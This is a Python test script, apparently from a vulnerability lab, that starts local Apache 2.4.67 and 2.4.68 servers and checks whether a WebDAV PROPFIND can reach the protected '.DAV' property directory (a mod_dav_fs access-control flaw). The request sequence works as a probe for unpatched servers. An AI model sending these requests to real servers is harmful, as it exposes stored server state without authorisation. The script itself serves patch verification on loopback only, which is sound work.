#!/usr/bin/env python3
"""Adjacent lane L7 oracle: CVE-2026-42535 mod_dav_fs state-dir access.

The 2.4.68 fix in modules/dav/fs/repos.c denies resolving a resource whose
leaf or parent directory is DAV_FS_STATE_DIR (".DAV").  On 2.4.67 a WebDAV
author can address the trusted property database directly.  This is a
path/access-control fix, NOT a memory-corruption primitive.

Loopback-only oracle: PUT + PROPPATCH a resource to materialize the ".DAV"
state directory, then PROPFIND "/.DAV".  Expect 207 on 2.4.67 (allowed) and
403 on 2.4.68 (denied by the fix).  No external traffic.

Usage (from lab/apache2shell):
  python3 l7-lane.py                # 2.4.67 affected, 2.4.68 control
  L7_VERSIONS=2.4.68 python3 l7-lane.py
"""
import os
import signal
import socket
import shutil
import subprocess
import sys
import time

BASE = "/home/mesh-home/mishe-tauftauf2shell/lab/apache2shell"
RUN = os.path.join(BASE, "run")
LOGS = os.path.join(BASE, "logs")
PORTS = {"2.4.67": 7296, "2.4.68": 7297}
INSTALL_FOR = lambda v: (
    os.path.join(BASE, "l2", "install-%s-asan" % v) if v == "2.4.67"
    else os.path.join(BASE, "l6", "install-%s-asan" % v))


def conf_for(version, port, docroot):
    install = INSTALL_FOR(version)
    return """ServerRoot "{install}"
PidFile "{pid}"
Listen 127.0.0.1:{port}
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule mime_module modules/mod_mime.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule dav_module modules/mod_dav.so
LoadModule dav_fs_module modules/mod_dav_fs.so
ServerName localhost
ErrorLog "{err}"
LogLevel info
DocumentRoot "{docroot}"
DavLockDB "{lockdb}"
<Directory "{docroot}">
  Require all granted
  Dav On
  Options +Indexes
</Directory>
""".format(install=install,
           pid=os.path.join(RUN, "l7-%s.pid" % version),
           port=port,
           err=os.path.join(LOGS, "l7-%s-error.log" % version),
           docroot=docroot,
           lockdb=os.path.join(RUN, "l7-davlock-%s" % version))


def request(port, method, path, body=b"", headers=None):
    s = socket.create_connection(("127.0.0.1", port), timeout=5)
    req = ("%s %s HTTP/1.1\r\nHost: localhost\r\n" % (method, path)).encode()
    req += b"Connection: close\r\n"
    if headers:
        for k, v in headers.items():
            req += ("%s: %s\r\n" % (k, v)).encode()
    if body:
        req += ("Content-Length: %d\r\n" % len(body)).encode()
    req += b"\r\n" + body
    s.sendall(req)
    data = b""
    while True:
        b = s.recv(65536)
        if not b:
            break
        data += b
    s.close()
    return data


def stop(pidfile):
    if not os.path.exists(pidfile):
        return
    for line in open(pidfile):
        try:
            os.kill(int(line.strip()), signal.SIGTERM)
        except ProcessLookupError:
            pass
    for _ in range(30):
        if not os.path.exists(pidfile):
            break
        time.sleep(0.1)


def probe(version, port):
    docroot = os.path.join(RUN, "l7-docroot-%s" % version)
    if os.path.isdir(docroot):
        shutil.rmtree(docroot)
    os.makedirs(docroot, exist_ok=True)
    err = os.path.join(LOGS, "l7-%s-error.log" % version)
    conf = os.path.join(RUN, "l7-%s.conf" % version)
    pidf = os.path.join(RUN, "l7-%s.pid" % version)
    open(conf, "w").write(conf_for(version, port, docroot))
    for p in (err,):
        if os.path.exists(p):
            os.unlink(p)
    stop(pidf)
    httpd = os.path.join(INSTALL_FOR(version), "bin", "httpd")
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = "detect_leaks=0"
    srv = subprocess.Popen([httpd, "-f", conf], stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, env=env)
    time.sleep(1.5)
    results = {}
    try:
        # Materialize a resource and its .DAV property store.
        results["PUT"] = request(port, "PUT", "/probe.txt", b"hello\n").split(b"\r\n", 1)[0]
        pbody = (b"<?xml version=\"1.0\"?>\n"
                 b"<D:propertyupdate xmlns:D=\"DAV:\"><D:set><D:prop>"
                 b"<D:author>probe</D:author></D:prop></D:set></D:propertyupdate>\n")
        pp = request(port, "PROPPATCH", "/probe.txt", pbody,
                     {"Content-Type": "application/xml"})
        results["PROPPATCH"] = pp.split(b"\r\n", 1)[0]
        # The oracle: address the state directory directly.
        pf = request(port, "PROPFIND", "/.DAV",
                     headers={"Depth": "1", "Content-Type": "application/xml"})
        results["PROPFIND /.DAV"] = pf.split(b"\r\n", 1)[0]
        pf2 = request(port, "PROPFIND", "/.DAV/probe.txt",
                      headers={"Depth": "0", "Content-Type": "application/xml"})
        results["PROPFIND /.DAV/probe.txt"] = pf2.split(b"\r\n", 1)[0]
    except Exception as e:
        results["ERROR"] = repr(e)
    stop(pidf)
    try:
        srv.wait(timeout=10)
    except subprocess.TimeoutExpired:
        srv.kill()
        srv.wait()
    out = srv.stdout.read().decode(errors="replace")
    log = open(err, errors="replace").read() if os.path.exists(err) else ""
    open(os.path.join(LOGS, "l7-%s-combined.log" % version), "w").write(log + out)
    print("=== %s port %d (fix in 2.4.68) ===" % (version, port))
    for k, v in results.items():
        print("  %-30s %s" % (k, v.decode(errors="replace")))
    print("  child SEGV: %d  child ABRT: %d  srv rc: %d" % (
        log.count("exit signal Segmentation fault"),
        log.count("exit signal Aborted"), srv.returncode))
    return results


if __name__ == "__main__":
    versions = sys.argv[1:] or os.environ.get("L7_VERSIONS", "2.4.67,2.4.68").split(",")
    for v in versions:
        probe(v, PORTS[v])
